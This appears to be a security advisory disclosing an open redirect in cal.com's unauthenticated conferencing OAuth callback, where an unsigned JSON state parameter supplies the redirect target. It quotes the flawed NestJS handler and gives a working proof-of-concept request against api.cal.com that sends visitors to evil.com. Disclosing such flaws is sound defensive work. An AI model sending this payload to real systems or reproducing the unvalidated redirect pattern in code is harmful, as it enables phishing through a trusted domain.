### Summary

The conferencing OAuth callback endpoint is unauthenticated and issues a 301 redirect to a URL supplied entirely by the caller via a raw, unsigned `state` query parameter. Any visitor who follows a crafted link originating from the cal.com API domain is silently sent to an attacker-controlled URL with no login or interaction required beyond clicking the link.

### Details

The handler in `apps/api/v2/src/modules/conferencing/controllers/conferencing.controller.ts` is decorated with `@UseGuards()` (no arguments), which in NestJS means no authentication guard is applied. The `state` query parameter is parsed as raw JSON with no signature or integrity check, and the `onErrorReturnTo` field from that JSON is used as the redirect destination whenever the `error` query parameter is present:

```ts
// apps/api/v2/src/modules/conferencing/controllers/conferencing.controller.ts
@Get("/:app/oauth/callback")
@UseGuards()                        // no guards — endpoint is unauthenticated
@Redirect(undefined, 301)
async save(
  @Query("state") state: string,
  @Query("error") error: string | undefined,
  @Query("error_description") error_description: string | undefined,
): Promise<{ url: string }> {
  const decodedCallbackState: OAuthCallbackState = JSON.parse(state);  // no signature check
  try {
    if (error) {
      throw new BadRequestException(error_description);  // trivially triggered
    }
    // ... token exchange (never reached) ...
  } catch (error) {
    return { url: decodedCallbackState.onErrorReturnTo ?? "" };  // unvalidated redirect target
  }
}
```

`@Redirect(undefined, 301)` causes NestJS to respond with `301 Location: <url>` using whatever URL the method returns. The error path executes before any database or service call, so there is no dependency on application state.

The codebase already contains an `isOriginAllowed` function in `apps/api/v2/lib/is-origin-allowed/is-origin-allowed.ts` that validates redirect URIs for the OAuth authorize flow, but it is not called here.

### PoC

No account required.

```
GET /api/v2/conferencing/zoom/oauth/callback?state=%7B%22onErrorReturnTo%22%3A%22https%3A%2F%2Fevil.com%22%2C%22fromApp%22%3Afalse%2C%22accessToken%22%3A%22%22%7D&error=1 HTTP/1.1
Host: api.cal.com
```

Decoded `state`: `{"onErrorReturnTo":"https://evil.com","fromApp":false,"accessToken":""}`

Response:

```
HTTP/1.1 301 Moved Permanently
Location: https://evil.com
```

The same payload works with `app=office365_video`. Any non-empty value for `error` is sufficient to trigger the redirect.

### Impact

This is an open redirect. An attacker can construct a link that appears to originate from the trusted `api.cal.com` domain and delivers the victim to an arbitrary external URL. Cal.com is used in business scheduling workflows where users routinely follow calendar and conferencing-related links, making this a viable phishing vector. No authentication, token, or prior relationship with the application is required.
